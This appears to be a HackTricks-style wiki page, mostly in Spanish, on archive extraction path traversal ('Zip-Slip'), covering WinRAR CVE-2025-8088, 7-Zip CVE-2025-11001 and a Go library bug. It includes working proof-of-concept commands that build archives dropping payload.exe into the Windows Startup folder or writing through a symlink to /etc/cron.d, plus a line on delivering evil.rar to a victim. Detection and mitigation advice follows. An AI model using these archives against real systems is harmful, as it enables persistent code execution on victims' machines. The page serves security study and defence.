# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Descripción general

Muchos formatos de archivo (ZIP, RAR, TAR, 7-ZIP, etc.) permiten que cada entrada lleve su propia **ruta interna**. Cuando una utilidad de extracción honra ciegamente esa ruta, un nombre de archivo manipulado que contenga `..` o una **ruta absoluta** (p. ej. `C:\Windows\System32\`) se escribirá fuera del directorio elegido por el usuario.
Esta clase de vulnerabilidad es ampliamente conocida como *Zip-Slip* o **archive extraction path traversal**.

Las consecuencias pueden ir desde sobrescribir archivos arbitrarios hasta conseguir directamente **remote code execution (RCE)** al dejar un payload en una ubicación **auto-run** como la carpeta *Startup* de Windows.

## Causa raíz

1. El atacante crea un archivo donde uno o más encabezados de archivo contienen:
* Secuencias de traversal relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Rutas absolutas (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* O **symlinks** manipulados que se resuelven fuera del directorio objetivo (común en ZIP/TAR en *nix*).
2. La víctima extrae el archivo con una herramienta vulnerable que confía en la ruta incrustada (o sigue symlinks) en lugar de sanearla o forzar la extracción dentro del directorio elegido.
3. El archivo se escribe en la ubicación controlada por el atacante y se ejecuta/carga la próxima vez que el sistema o el usuario active esa ruta.

### .NET `Path.Combine` + `ZipArchive` traversal

Un anti-pattern común en .NET es combinar el destino previsto con el **controlado por el usuario** `ZipArchiveEntry.FullName` y extraer sin normalizar la ruta:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Si `entry.FullName` comienza con `..\\` realiza traversal; si es una **absolute path** se descarta por completo el componente izquierdo, lo que produce una **arbitrary file write** como la identidad de extracción.
- Archivo de prueba de concepto para escribir en un directorio hermano `app` vigilado por un escáner programado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Colocar ese ZIP en el buzón monitorizado da como resultado `C:\samples\app\0xdf.txt`, demostrando traversal fuera de `C:\samples\queue\` y habilitando primitivas posteriores (p. ej., DLL hijacks).

## Ejemplo del mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR para Windows (incluyendo la CLI `rar` / `unrar`, la DLL y el código fuente portable) no validaba los nombres de archivo durante la extracción.
Un archivo RAR malicioso que contiene una entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
terminaría **fuera** del directorio de salida seleccionado y dentro de la carpeta *Startup* del usuario. Tras iniciar sesión, Windows ejecuta automáticamente todo lo presente allí, proporcionando RCE *persistente*.

### Creación de un archivo PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opciones usadas:
* `-ep`  – almacenar las rutas de archivo exactamente como se dan (no podar el prefijo `./`).

Entregar `evil.rar` a la víctima e indicarle que lo extraiga con una versión vulnerable de WinRAR.

### Explotaciones observadas en el mundo real

ESET informó campañas de spear-phishing de RomCom (Storm-0978/UNC2596) que adjuntaban archivos RAR explotando CVE-2025-8088 para desplegar backdoors personalizados y facilitar operaciones de ransomware.

## Casos más recientes (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entries that are **symbolic links** se desreferenciaban durante la extracción, permitiendo a los atacantes escapar del directorio de destino y sobrescribir rutas arbitrarias. La interacción del usuario es solo *abrir/extraer* el archivo.
* **Afectados**: 7-Zip 21.02–24.09 (builds para Windows y Linux). Corregido en **25.00** (julio de 2025) y posteriores.
* **Ruta de impacto**: Sobrescribir `Start Menu/Programs/Startup` o ubicaciones donde se ejecutan servicios → el código se ejecuta en el siguiente inicio de sesión o reinicio del servicio.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
On a patched build `/etc/cron.d` won’t be touched; the symlink is extracted as a link inside /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` follows `../` and symlinked ZIP entries, writing outside `outputDir`.
* **Afectados**: `github.com/mholt/archiver` ≤ 3.5.1 (proyecto ahora obsoleto).
* **Fix**: Cambiar a `mholt/archives` ≥ 0.1.0 o implementar comprobaciones de ruta canónica antes de escribir.
* **Reproducción mínima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Consejos de detección

* **Inspección estática** – Enumerar las entradas del archivo y marcar cualquier nombre que contenga `../`, `..\\`, *rutas absolutas* (`/`, `C:`) o entradas del tipo *symlink* cuyo destino esté fuera del directorio de extracción.
* **Canonización** – Asegurarse de que `realpath(join(dest, name))` todavía comience con `dest`. Rechazar en caso contrario.
* **Extracción en sandbox** – Descomprimir en un directorio desechable usando un extractor *safe* (p. ej., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) y verificar que las rutas resultantes permanezcan dentro del directorio.
* **Monitoreo de endpoints** – Generar alertas por nuevos ejecutables escritos en ubicaciones `Startup`/`Run`/`cron` poco después de que un archivo sea abierto por WinRAR/7-Zip/etc.

## Mitigación y endurecimiento

1. **Actualiza el extractor** – WinRAR 7.13+ y 7-Zip 25.00+ implementan la sanitización de rutas/symlink. Ambos herramientas aún carecen de autoactualización.
2. Extraer archivos con “**Do not extract paths**” / “**Ignore paths**” cuando sea posible.
3. En Unix, bajar privilegios y montar un **chroot/namespace** antes de la extracción; en Windows, usar **AppContainer** o un sandbox.
4. Si escribes código personalizado, normaliza con `realpath()`/`PathCanonicalize()` **antes** de crear/escribir, y rechaza cualquier entrada que escape del destino.

## Casos adicionales afectados / históricos

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Cualquier lógica de extracción personalizada que no llame a `PathCanonicalize` / `realpath` antes de escribir.

## Referencias

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
